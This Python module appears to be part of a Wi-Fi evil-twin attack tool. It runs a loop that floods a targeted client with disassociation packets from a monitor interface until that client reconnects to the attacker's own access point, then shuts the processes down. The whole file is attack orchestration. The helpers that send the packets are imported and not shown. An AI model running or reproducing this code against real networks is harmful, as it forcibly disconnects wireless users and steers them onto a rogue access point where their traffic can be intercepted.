import time
from multiprocessing import Process
from multiprocessing import Event

from interface_manager import InterfaceManager
from runtime_config import RuntimeConfig
from wlan_manager import WlanManager


class Attack(object):
    def __init__(self, rc: RuntimeConfig, wl: WlanManager, im: InterfaceManager):
        self._rc = rc
        self._wl = wl
        self._im = im

    def _worker_diassoc_attack(self, should_exit_event: Event):
        while not should_exit_event.is_set():
            print("Sending disassociation packets...")
            self._wl.send_diassoc_packets(self._rc.monitor_wlan_interface,
                                          self._rc.attacked_ap.bssid,
                                          self._rc.attacked_endpoint)
            time.sleep(1)
        print("Endpoint connected to us!")



    def start_attack(self):
        self._rc.validate()
        should_exit_event = Event()
        endpoint_connected_event = Event()
        p_wait_for_endpoint = Process(target=self._wl.wait_for_endpoint_to_connect,
                                      args=(self._rc.monitor_wlan_interface,
                                            self._rc.attacked_ap.channel,
                                            self._rc.attacked_endpoint,
                                            self._im.get_interface_addr(self._rc.ap_wlan_interface), should_exit_event, endpoint_connected_event),
                                      daemon=True)

        p_wait_for_endpoint.start()

        p_diassoc = Process(target=self._worker_diassoc_attack, args=(should_exit_event,), daemon=True)
        p_diassoc.start()

        endpoint_connected_event.wait()
        should_exit_event.set()
        p_diassoc.join()

        p_wait_for_endpoint.terminate()
        p_diassoc.terminate()
